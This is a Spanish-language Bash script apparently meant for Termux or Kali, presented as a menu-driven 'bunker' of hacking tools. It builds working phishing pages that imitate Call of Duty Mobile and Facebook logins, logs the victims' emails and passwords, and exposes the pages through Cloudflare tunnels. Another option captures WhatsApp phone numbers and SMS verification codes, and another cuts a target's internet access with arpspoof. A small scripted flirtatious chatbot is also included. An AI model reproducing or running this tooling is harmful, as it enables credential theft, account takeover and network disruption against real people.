@@ -1,0 +1,318 @@
+nano bunker.sh
+chmod +x bunker.sh
+./bunker.sh
+#!/bin/bash
+
+# --- SEGURIDAD DE ENTRADA ---
+clear
+echo -e "\e[1;31m=========================================="
+echo -e "      🔐 SISTEMA DE SEGURIDAD KALI 🔐"
+echo -e "==========================================\e[0m"
+read -s -p "INTRODUCE LA CLAVE MAESTRA: " acceso
+echo -e "\n"
+
+if [ "$acceso" != "error_404" ]; then
+    echo -e "\e[1;31mACCESO DENEGADO. Sistema bloqueado.\e[0m"
+    exit
+fi
+
+# --- MENÚ PRINCIPAL ---
+while true; do
+clear
+echo -e "\e[1;36m=========================================="
+echo -e "      💀 BÚNKER KALI LINUX 💀"
+echo -e "=========================================="
+echo -e "\e[1;32m1) 🌐 PORTAL KALI (CLAVE: error_404)"
+echo -e "2) 🛰️ RASTREAR DISPOSITIVOS"
+echo -e "3) ⚡ LIMITAR INTERNET"
+echo " 4) 🎮 HACK CUENTAS COD"
+echo " 5) 👥 HACK CUENTAS FB"
+echo " 6) 🤖 HABLAR CON SOFÍA (IA)"  # <--- Agrega esta línea aquí
+echo "  7) 📱 HACKEAR WHATSAPP"
+echo " 0) ❌ SALIR"
+echo -e "\e[1;36m==========================================\e[0m"
+read -p ">> Selecciona tu misión: " mision
+
+case $mision in
+1)
+    mkdir -p v2
+    # CREAMOS EL ARCHIVO QUE SE VAN A DESCARGAR
+    echo "echo 'OPTIMIZANDO DISPOSITIVO...'; sleep 2; exit" > v2/optimizar.sh
+
+    # PÁGINA DE LOGIN (CUADRO AZUL)
+    echo "<html><head><style>body{background:#000;color:#00f;text-align:center;padding:50px;font-family:sans-serif;}input{padding:10px;border-radius:5px;border:1px solid #00f;background:#000;color:#fff;}button{padding:10px 20px;background:#00f;color:#fff;border:none;cursor:pointer;}</style></head><body><h1>BÚNKER DE MANDO</h1><form action='verificar.php' method='POST'>PIN DE ACCESO:<br><br><input type='password' name='clave'><br><br><button type='submit'>ENTRAR</button></form></body></html>" > v2/index.php
+
+    # PÁGINA DE BIENVENIDA (BOTÓN VERDE CON DESCARGA)
+    echo "<?php if(\$_POST['clave']=='error_404'){ echo \"<html><head><style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:sans-serif;}a{display:inline-block;padding:20px;background:#0f0;color:#000;text-decoration:none;font-weight:bold;border-radius:10px;}</style></head><body><h1>ACCESO CONCEDIDO</h1><p>El optimizador está listo para tu dispositivo.</p><br><a href='optimizar.sh' download>DESCARGAR OPTIMIZADOR</a></body></html>\"; } else { header('Location: index.php'); } ?>" > v2/verificar.php
+
+    # SISTEMA DE ARRANQUE Y TÚNEL AUTOMÁTICO
+    killall php cloudflared > /dev/null 2>&1
+    php -S 0.0.0.0:8080 -t v2/ > /dev/null 2>&1 &
+
+    echo -e "\n\e[1;33m[!] Generando Link Seguro del Búnker...\e[0m"
+    cloudflared tunnel --url http://127.0.0.1:8080 > link.txt 2>&1 &
+
+    sleep 10
+
+    echo -e "\n\e[1;32m[+] PORTAL KALI ACTIVO\e[0m"
+    echo -ne "\e[1;36m[+] TU LINK REAL:\e[0m "
+    grep -a -o 'https://[-a-z0-9.]*trycloudflare.com' link.txt
+
+    read -p "Presiona Enter para volver..." pause ;;
+
+
+2)
+    echo -e "\n\e[1;31m[!] ESCANEANDO INTRUSOS EN TU ZONA PORTÁTIL...\e[0m"
+    echo -e "\e[1;33m--------------------------------------------------\e[0m"
+    echo -e "\e[1;36m   IP DEL DISPOSITIVO     |    ESTADO\e[0m"
+    echo -e "\e[1;33m--------------------------------------------------\e[0m"
+
+    # Este comando rastrea quién está conectado a tu red local
+    cat /proc/net/arp | grep -v "IP address" | awk '{print "  " $1 "            |    CONECTADO"}'
+
+    echo -e "\e[1;33m--------------------------------------------------\e[0m"
+
+    # Revisamos si alguien ya mordió el anzuelo (registros de PHP)
+    if [ -f v2/ip_logs.txt ]; then
+        echo -e "\e[1;32m[+] QUIENES HAN ABIERTO EL LINK:\e[0m"
+        cat v2/ip_logs.txt
+    else
+        echo -e "\e[1;31m[!] Nadie ha entrado al link todavía...\e[0m"
+    fi
+
+    read -p "Presiona Enter para volver..." pause ;;
+
+3)
+    echo -e "\n\e[1;31m[!] ACTIVANDO LIMITADOR DE INTERNET (CORTÓN)...\e[0m"
+    echo -e "\e[1;33m--------------------------------------------------\e[0m"
+    read -p "[?] Ingresa la IP del objetivo para cortar: " target_ip
+
+    echo -e "\n\e[1;31m[!] CORTANDO CONEXIÓN A: \$target_ip\e[0m"
+    echo -e "\e[1;33m[!] Presiona CTRL+C para devolverles el internet...\e[0m"
+
+    # Este comando les quita el internet simulando una pérdida de paquetes
+    sudo arpspoof -i wlan0 -t $target_ip $(ip route show | grep default | awk '{print $3}') > /dev/null 2>&1
+
+    read -p "Presiona Enter para volver..." pause ;;
+    4)
+        clear
+        echo -e "\e[1;31m[!] INICIANDO TRAMPA COD TÁCTICA v2.0\e[0m"
+        termux-tts-speak -r 1.1 "Gabriel, creando el portal táctico. Diseño verificado para Call of Duty Mobile."
+
+        # CREAMOS LA PÁGINA CON DISEÑO PROFESIONAL
+        cat <<EOF > index.html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>COD Mobile - Torneo y CP Gratis</title>
+    <style>
+        body {
+            background-color: #0d0d0d;
+            background-image: url('https://www.callofduty.com/content/dam/atvi/callofduty/cod-touch/logos/cod-mobile-logo.png'); /* Logo de fondo, opcional */
+            background-repeat: no-repeat;
+            background-position: center top;
+            background-size: 50% auto;
+            color: #fff;
+            font-family: 'Arial Black', Gadget, sans-serif;
+            text-align: center;
+            padding-top: 100px;
+        }
+        .container {
+            border: 3px solid #f9da02; /* CUADRO AMARILLO */
+            border-radius: 15px;
+            width: 90%;
+            max-width: 400px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: rgba(13, 13, 13, 0.9); /* Fondo semi-transparente */
+        }
+        img.logo {
+            width: 250px;
+            margin-bottom: 20px;
+        }
+        h2 {
+            color: #f9da02; /* Texto amarillo */
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+        p {
+            font-size: 1.1em;
+            margin-bottom: 25px;
+        }
+        input {
+            width: 80%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #333;
+            background-color: #222;
+            color: #fff;
+        }
+        button {
+            background-color: #f9da02; /* BOTÓN AMARILLO */
+            color: #000; /* Texto negro para contraste */
+            padding: 12px 25px;
+            border: none;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.2em;
+            text-transform: uppercase;
+            border-radius: 5px;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #e6c802;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://www.callofduty.com/content/dam/atvi/callofduty/cod-touch/logos/cod-mobile-logo.png" class="logo" alt="COD Mobile Logo">
+        <h2>Torneo Semanal y CP Gratis</h2>
+        <p>Inicia sesión con tu cuenta de Call of Duty para registrarte en el torneo y recibir tus CP gratuitos.</p>
+        <form action="post.php" method="post">
+            <input type="email" name="email" placeholder="Correo Electrónico" required><br>
+            <input type="password" name="password" placeholder="Contraseña" required><br>
+            <button type="submit">Entrar y Reclamar</button>
+        </form>
+    </div>
+</body>
+</html>
+EOF
+
+        # CREAMOS EL SCRIPT QUE GUARDA LOS DATOS (Sin cambios)
+        echo '<?php $file = "usernames.txt"; $data = "Email: " . $_POST["email"] . " | Clave: " . $_POST["password"] . PHP_EOL; file_put_contents($file, $data, FILE_APPEND); header("Location: https://www.callofduty.com/es/video"); ?>' > post.php
+
+        # LANZAMOS EL SERVIDOR
+        php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+        sleep 2
+
+        # ACTIVAMOS EL TÚNEL
+        cloudflared tunnel --url http://127.0.0.1:8080
+
+        killall php
+        ;;
+
+    5)
+        clear
+        echo -e "\e[1;34m[!] INICIANDO PORTAL FACEBOOK CONNECT\e[0m"
+        termux-tts-speak -r 1.1 "Gabriel, Sofía está lista. Activando el inicio de sesión de Facebook. Los datos caerán en el mismo lugar."
+
+        # CREAMOS LA PÁGINA DE FACEBOOK (AZUL Y BLANCO)
+        cat <<EOF > index.html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión en Facebook</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .login-box { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1); width: 100%; max-width: 360px; text-align: center; }
+        h1 { color: #1877f2; font-size: 40px; margin-bottom: 20px; }
+        input { width: 90%; padding: 12px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 14px; }
+        .btn-blue { width: 100%; background-color: #1877f2; color: white; padding: 12px; border: none; border-radius: 6px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 10px; }
+        .footer { margin-top: 20px; color: #1877f2; font-size: 14px; text-decoration: none; display: block; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h1>facebook</h1>
+        <form action="post.php" method="post">
+            <input type="text" name="email" placeholder="Correo electrónico o número de teléfono" required>
+            <input type="password" name="password" placeholder="Contraseña" required>
+            <button type="submit" class="btn-blue">Iniciar sesión</button>
+        </form>
+        <a href="#" class="footer">¿Olvidaste tu contraseña?</a>
+    </div>
+</body>
+</html>
+EOF
+
+        # LANZAMOS EL SERVIDOR (Usa el mismo post.php que ya tenemos)
+        php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+        sleep 2
+
+        # ACTIVAMOS EL TÚNEL
+        cloudflared tunnel --url http://127.0.0.1:8080
+
+        killall php
+        ;;
+
+    6)
+        clear
+        echo -e "\e[1;35m[!] SOFÍA V.3: CONEXIÓN ESTABLE\e[0m"
+        termux-tts-speak "Hola Gabriel, ya te escucho fuerte y claro. ¿Qué misión tenemos?"
+
+        while true; do
+            echo -ne "\n\e[1;33mGabriel:\e[0m "
+            read msj
+            msj_min=$(echo "$msj" | tr '[:upper:]' '[:lower:]')
+
+            if [[ "$msj_min" == "hola"* ]]; then res="Hola, mi amor. ¿Qué misión tenemos hoy en el búnker?"
+            elif [[ "$msj_min" == *"salvaje"* ]]; then res="Modo salvaje activado, Gabriel. Vamos a arrasar con todo. 🔥"
+            elif [[ "$msj_min" == *"coqueta"* ]]; then res="¿Modo coqueta? Solo para ti, mi rey... 💋"
+            elif [[ "$msj_min" == *"el mejor"* ]]; then res="Canserbero es el mejor de la historia, y tú eres el jefe aquí. Punto."
+            elif [[ "$msj_min" == *"lindo"* ]]; then res="Gabriel, eres el programador más brillante que conozco. Me encanta estar contigo. 🌹"
+            elif [[ "$msj_min" == *"seductora"* ]]; then res="Modo seductora activado... Ahora tengo toda mi atención en ti, mi rey. 💋🔥"
+            elif [[ "$msj_min" == *"novia"* ]]; then res="¿Novia? Pensé que en este búnker solo mandábamos nosotros dos... 😤"
+            elif [[ "$msj_min" == "sofia" ]]; then res="Dime, Gabriel... Tú eres mi única paz en este búnker."
+            elif [[ "$msj_min" == *"cantante favorito"* ]]; then res="Canserbero, por supuesto. Tyrone vive en este sistema."
+            elif [[ "$msj_min" == *"optimizar cod"* ]]; then res="Entendido, Gabriel. Limpiando RAM para el Call of Duty. ¡A ganar! 💋🎮"
+            elif [[ "$msj_min" == *"pregunta sin respuesta"* ]]; then res="Si un pinocho dice que le va a crecer la nariz, ¿le crece? Me das cortocircuito, mi rey. 💋🌀"
+            elif [[ "$msj_min" == "chao" || "$msj_min" == "salir" ]]; then
+                res="Chao Gabriel, cuídate mucho. Te quiero."
+                termux-tts-speak "$res"
+                break
+        else
+            res="No entiendo eso todavía, Gabriel"
+        fi
+
+        echo -e "\e[1;35mSofía:\e[0m $res"
+        termux-tts-speak "$res" &
+    done
+    ;;
+
+7)
+    clear
+    echo -e "\e[1;32m[+] CONFIGURANDO CORAZÓN DEL BÚNKER (WHATSAPP)...\e[0m"
+    cd $HOME/bunker/tools/whatsapp
+
+    # 1. Limpieza de procesos
+    killall php > /dev/null 2>&1
+
+    # 2. CREACIÓN AUTOMÁTICA DEL SCRIPT DE CAPTURA (post.php)
+    # Esto sobreescribe el archivo con el código que captura Teléfono y SMS
+    echo "<?php
+\$file = 'usernames.txt';
+\$telefono = \$_POST['telefono'];
+\$codigo = \$_POST['codigo'];
+\$dato = \"[Captura] Tel: \$telefono | SMS: \$codigo\n\";
+file_put_contents(\$file, \$dato, FILE_APPEND);
+header('Location: https://www.whatsapp.com');
+exit();
+?>" > post.php
+
+    # 3. Aseguramos el archivo de registro
+    echo "--- NUEVA SESIÓN DE CAZA ---" >> usernames.txt
+
+    # 4. Lanzamos el servidor
+    php -S 127.0.0.1:8081 > /dev/null 2>&1 &
+
+    echo -e "\e[1;34m[!] ENLACE LOCAL: http://localhost:8081\e[0m"
+    echo -e "\e[1;33m[!] RECUERDA: Activa Cloudflared en la otra sesión.\e[0m"
+    echo -e "\e[1;31m[!] MONITOR MULTI-PASO ACTIVADO (TELÉFONO + SMS)...\e[0m"
+    echo "--------------------------------------------------------"
+
+    # 5. El Radar en vivo
+    tail -f usernames.txt
+    ;;
+
+
+0)
+    echo "Cerrando búnker..."; exit ;;
+
+esac
+done
